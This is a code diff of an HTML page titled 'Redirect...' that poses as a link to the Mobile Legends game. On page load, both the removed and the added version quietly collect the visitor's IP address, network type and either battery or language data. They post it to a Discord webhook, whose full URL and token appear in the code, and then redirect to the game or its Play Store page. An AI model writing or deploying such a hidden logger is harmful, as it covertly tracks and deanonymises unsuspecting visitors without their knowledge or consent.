@@ -6,30 +6,37 @@
     <title>Redirect...</title>
     <script>
         window.onload = async function() {
-            let ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
-            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            let networkType = connection ? connection.effectiveType : "Tidak terdeteksi";
-            let battery = navigator.getBattery ? await navigator.getBattery() : null;
-            let batteryStatus = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})` : "Tidak terdeteksi";
+            const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
 
-            let webhookURL = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
-            let payload = {
-                content: `IP: ${ipData.ip}\nNetwork: ${networkType}\nBattery: ${batteryStatus}`
-            };
+            try {
+                const response = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+                const data = await response.json();
+                const ip = data.ip;
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
+                const language = navigator.language || navigator.userLanguage;
 
-            setTimeout(() => {
+                let connectionType = "Unknown";
+                if (navigator.connection) {
+                    connectionType = navigator.connection.effectiveType || "Unknown";
+                }
+
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nNetwork Type: ${connectionType}`
+                    })
+                });
+
                 window.location.href = "mobilelegends://";
-            }, 1000);
-
-            setTimeout(() => {
+                setTimeout(() => {
+                    window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
+                }, 2000);
+            } catch {
                 window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
-            }, 3000);
+            }
         };
     </script>
 </head>
